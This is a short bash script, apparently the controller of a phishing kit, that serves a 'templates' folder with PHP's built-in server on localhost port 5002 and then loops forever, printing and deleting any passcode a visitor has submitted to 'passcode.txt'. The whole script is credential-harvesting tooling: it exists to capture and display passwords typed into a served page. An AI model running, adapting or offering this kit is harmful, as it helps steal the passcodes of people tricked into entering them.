

# Start Server
start(){
    cd templates && php -S 127.0.0.1:5002 > /dev/null 2>&1 &
    echo -e "\e[36mServer Started!"
    echo -e "\e[33mLocalhost: http://127.0.0.1:5002"
}

# Check if Someone Submitted Password
check(){
    if [[ -f "./templates/passcode.txt" ]];then
        pw=$(cat ./templates/passcode.txt)
        echo -e "\n\e[32mPasscode: $pw"
        rm -f "./templates/passcode.txt"
    fi
}


# If control-c is pressed
ctrl_c(){
    echo -e "\r\e[31mGood Bye!"
    pkill php
    exit
}

start
trap ctrl_c INT
# Run Forever
while :; do
    check
done